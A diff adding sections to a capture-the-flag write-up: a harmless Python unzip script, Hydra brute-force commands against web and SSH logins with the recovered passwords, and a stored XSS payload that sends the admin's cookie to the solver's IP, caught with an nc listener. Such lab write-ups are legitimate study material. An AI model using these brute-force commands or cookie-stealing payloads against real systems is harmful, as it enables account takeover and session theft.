@@ -454,17 +454,72 @@ We can use ssh to login into charlie's account using the above password, and we 
 
 ## File Confusion
 
-```shell
+```markdown
+This challenge involves Python scripting related to functionalities of different libraries.
+
+Using the reference given, we have to write Python scripts to extract all files in the archives, extract metadata from the files, and extract text from the files.
+```
+
+```python
+#script to unzip zip files
+#this has to be there in the same directory as the zip files
+import os, zipfile
+
+def unzip(path):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            filename = os.path.join(root, file)
+            if (filename.endswith('.zip')):
+                currentdir = filename[:-4]
+                if not os.path.exists(currentdir):
+                    os.makedirs(currentdir)
+                with zipfile.ZipFile(filename) as zipObj:
+                    zipObj.extractall(currentdir)
+
+unzip('/home/sv/Downloads/')
+#this path has to be later replaced with the directory /final-final-compressed
+#number of files - 50
+#similarly, other scripts can be written
 ```
 
 ## Hydra-ha-ha-haa
 
 ```shell
+#we have to bruteforce web and ssh password for molly using Hydra
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.27.89 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+#gives password 'sunshine'
+#login to get flag1
+
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.27.89 -t 4 ssh
+#gives password 'butterfly'
+#ssh to get flag2
 ```
 
 ## ELF JS
 
+```markdown
+This room is about XSS (Cross Site Scripting).
+
+On the given link, firstly we have to register and create an account.
+
+After logging in, it looks like a simple forum at first; we have an option to fill in an entry as well.
+
+We can try simple XSS payloads to check if XSS works.
+
+Once we get to know that it works, we can proceed with getting the admin's authid.
+
+As given in the reference material, we can use a XSS payload which retrieves the cookie value whenever someone logs in; we will have to use our local IP.
+```
+
+```js
+<script>window.location = 'http://10.17.48.136/page?c=' + document.cookie </script>
+```
+
 ```shell
+#once we enter this as a comment, the website will be unusable
+#we have to listen to our web server for admin login
+nc -nvlp 80
+#after a while, we get the admin's authid
 ```
 
 ## Commands
